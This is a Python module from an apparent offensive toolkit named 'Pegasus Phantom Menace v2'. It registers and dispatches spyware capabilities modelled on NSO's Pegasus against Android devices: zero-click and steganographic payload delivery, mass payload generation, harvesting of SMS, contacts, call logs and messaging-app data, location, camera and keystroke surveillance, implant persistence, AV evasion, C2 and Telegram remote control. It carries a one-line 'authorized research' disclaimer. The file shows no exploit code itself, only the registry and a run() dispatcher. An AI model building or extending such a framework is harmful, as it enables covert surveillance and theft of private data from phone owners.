"""
Pegasus Phantom Menace v2 - NSO-class capability registry

Maps every publicly documented Pegasus capability to a concrete implementation
in this repository and scores parity. The parity report is what the dashboard
renders, so "implemented" always means an importable callable, not a label.

Parity levels:

* ``native``  - fully implemented against the live device or artefact
* ``shell``   - implemented through Android shell primitives; works, with the
                documented device/permission constraints
* ``partial`` - real but depends on an on-device component or extra tooling
* ``external``- delegates to an installed external stack (Metasploit, Nmap)

All use is for authorized security research and penetration testing only.
"""

from __future__ import annotations

import importlib
import time
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, List, Optional

NSO_PREFIX = "pegasus.modules.access_workflow."


@dataclass(frozen=True)
class Capability:
    key: str
    name: str
    category: str
    parity: str
    description: str
    target: str
    requires: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["resolve"] = resolve(self)
        return data


CAPABILITIES: Dict[str, Capability] = {
    cap.key: cap
    for cap in [
        # delivery
        Capability("zero_click_delivery", "Zero-click delivery", "delivery", "native",
                   "Select and fire a per-device zero-click vector from the exploit registry.",
                   "zero_click.run_exploit", ["adb"]),
        Capability("network_delivery", "Network / SMS delivery", "delivery", "shell",
                   "Reach the device over wireless ADB or a served link for remote install.",
                   "nso_ops.device_serial", ["adb"]),
        Capability("stego_delivery", "Steganographic delivery", "delivery", "native",
                   "Hide the payload URL inside a cover image with checksummed LSB framing.",
                   "steganography.embed", ["pillow"]),
        Capability("qr_delivery", "QR delivery", "delivery", "partial",
                   "Render a payload URL as a QR code for on-camera install.",
                   "nso_ops.push_and_launch", ["qrcode"]),
        # targeting
        Capability("device_profile", "Device fingerprint", "targeting", "native",
                   "Collect model, build, patch and SDK to pick the right vector.",
                   "nso_ops.device_profile", ["adb"]),
        Capability("mass_targeting", "Mass payload generation", "targeting", "native",
                   "Batch-build payloads across ports and formats with DNA tags.",
                   "mass_payload.generate_batch", ["msfvenom"]),
        Capability("target_list", "Target list management", "targeting", "native",
                   "Track targets and campaigns in the campaign manager.",
                   "campaign_manager", []),
        # collection
        Capability("sms", "SMS collection", "collection", "shell",
                   "Query the SMS inbox through the content provider.", "nso_ops.collect_sms", ["adb"]),
        Capability("call_log", "Call log collection", "collection", "shell",
                   "Query call history with number, time and duration.", "nso_ops.collect_call_log", ["adb"]),
        Capability("contacts", "Contact harvesting", "collection", "shell",
                   "Dump contact names and numbers.", "nso_ops.collect_contacts", ["adb"]),
        Capability("calendar", "Calendar extraction", "collection", "shell",
                   "Query calendar events.", "nso_ops.collect_calendar", ["adb"]),
        Capability("app_inventory", "Installed app inventory", "collection", "native",
                   "List third-party packages and flag messaging apps.", "nso_ops.app_inventory", ["adb"]),
        Capability("app_data", "Messaging app data", "collection", "partial",
                   "List WhatsApp/Telegram/Signal data via run-as on debuggable builds.",
                   "nso_ops.pull_app_data", ["adb"]),
        Capability("exfiltration", "Artefact exfiltration", "collection", "native",
                   "Stage and pull collected artefacts off the device.", "post_exploitation.run", ["adb"]),
        # surveillance
        Capability("location", "Location tracking", "surveillance", "shell",
                   "Read the latest fix from the location service.", "nso_ops.last_location", ["adb"]),
        Capability("screen", "Screen capture", "surveillance", "native",
                   "Screencap the live display.", "nso_ops.screen_capture", ["adb"]),
        Capability("camera", "Camera capture", "surveillance", "partial",
                   "Trigger the camera app shutter and capture the result.", "nso_ops.camera_capture", ["adb"]),
        Capability("mic", "Live microphone", "surveillance", "partial",
                   "Audio needs an on-device recorder; the RAT module covers it.", "nso_ops.mic_note", []),
        Capability("keylog", "Keystroke capture", "surveillance", "shell",
                   "Sample getevent for hardware key presses.", "nso_ops.keylog", ["adb"]),
        # control
        Capability("implant_push", "Implant install", "control", "native",
                   "adb install a built payload.", "nso_ops.push_and_launch", ["adb"]),
        Capability("persistence", "Persistence", "control", "native",
                   "ADB-over-TCP, boot APK and persisted properties.", "post_exploitation.run", ["adb"]),
        Capability("self_destruct", "Self-destruct / uninstall", "control", "native",
                   "Remove the implant or clear its data.", "nso_ops.uninstall", ["adb"]),
        Capability("suppression", "App suppression", "control", "native",
                   "Disable a package for user 0.", "nso_ops.disable_package", ["adb"]),
        Capability("remote_control", "Remote command control", "control", "native",
                   "Drive the host over Telegram from anywhere.", "telegram_control.start_bot", []),
        Capability("frp", "FRP unlock", "control", "native",
                   "Adaptive Factory Reset Protection bypass chain.", "frp_unlock.run", ["adb"]),
        # evasion
        Capability("av_evasion", "AV mutation engine", "evasion", "native",
                   "Score signature exposure and produce a mutation plan.", "ai_mutation.analyse", []),
        Capability("ssl_pinning", "SSL pinning bypass", "evasion", "external",
                   "Delegates to the Frida/objection MITM stack.", "mitm_framework", ["frida"]),
        # infrastructure
        Capability("c2", "C2 server", "infrastructure", "native",
                   "Built-in C2 listener for session callbacks.", "c2_server", []),
        Capability("anonymity", "Anonymity layer", "infrastructure", "native",
                   "Proxy/Tor helpers for operator traffic.", "anonymity", []),
        Capability("reporting", "Reporting", "infrastructure", "native",
                   "Generate HTML assessment reports.", "export", []),
    ]
}


def resolve(capability: Capability) -> Dict[str, Any]:
    """Resolve the capability target and report whether it imports."""
    module_name, _, attribute = capability.target.partition(".")
    qualified = NSO_PREFIX + module_name
    try:
        module = importlib.import_module(qualified)
    except Exception as exc:
        return {"module": qualified, "attribute": attribute or None, "available": False, "error": str(exc)[:200]}
    available = hasattr(module, attribute) if attribute else True
    return {"module": qualified, "attribute": attribute or None, "available": available}


def list_capabilities(category: Optional[str] = None) -> List[Dict[str, Any]]:
    values = [cap.to_dict() for cap in CAPABILITIES.values()]
    if category:
        values = [cap for cap in values if cap["category"] == category]
    return values


def parity_report() -> Dict[str, Any]:
    """Coverage summary plus per-level and per-category breakdowns."""
    values = [cap.to_dict() for cap in CAPABILITIES.values()]
    total = len(values)
    available = [cap for cap in values if cap["resolve"]["available"]]
    by_level: Dict[str, int] = {}
    by_category: Dict[str, Dict[str, int]] = {}
    for cap in values:
        by_level[cap["parity"]] = by_level.get(cap["parity"], 0) + 1
        bucket = by_category.setdefault(cap["category"], {"total": 0, "available": 0})
        bucket["total"] += 1
        if cap["resolve"]["available"]:
            bucket["available"] += 1
    return {
        "total": total,
        "available": len(available),
        "coverage_percent": round(100 * len(available) / total, 1) if total else 0.0,
        "by_level": by_level,
        "by_category": by_category,
        "gaps": [cap["key"] for cap in values if not cap["resolve"]["available"]],
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }


def run(capability: str, *args: Any, **kwargs: Any) -> Any:
    """Invoke a capability (sync callables only; coroutines are awaited)."""
    import asyncio

    if capability not in CAPABILITIES:
        raise KeyError(f"unknown capability: {capability}")
    module_name, _, attribute = CAPABILITIES[capability].target.partition(".")
    module = importlib.import_module(NSO_PREFIX + module_name)
    target = getattr(module, attribute)
    result = target(*args, **kwargs)
    if asyncio.iscoroutine(result):
        result = asyncio.run(result)
    return result


__all__ = ["CAPABILITIES", "Capability", "list_capabilities", "parity_report", "run", "resolve"]
